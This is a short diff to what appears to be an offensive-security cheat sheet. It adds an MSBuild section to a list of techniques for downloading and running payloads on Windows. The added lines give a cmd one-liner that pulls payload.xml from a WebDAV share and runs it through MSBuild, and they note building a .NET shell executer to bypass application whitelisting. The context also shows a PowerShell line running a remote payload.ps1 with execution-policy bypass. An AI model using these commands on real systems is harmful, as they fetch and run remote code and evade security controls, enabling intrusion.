@@ -393,7 +393,14 @@ Example XSL file
     </ms:script>
 </stylesheet>
 ```
-
+## Msbuild
+```
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
+```
+Create own shell executer in .NET and build to bypass Application whitelisting
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
+```
 ## Powershell
 ```
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
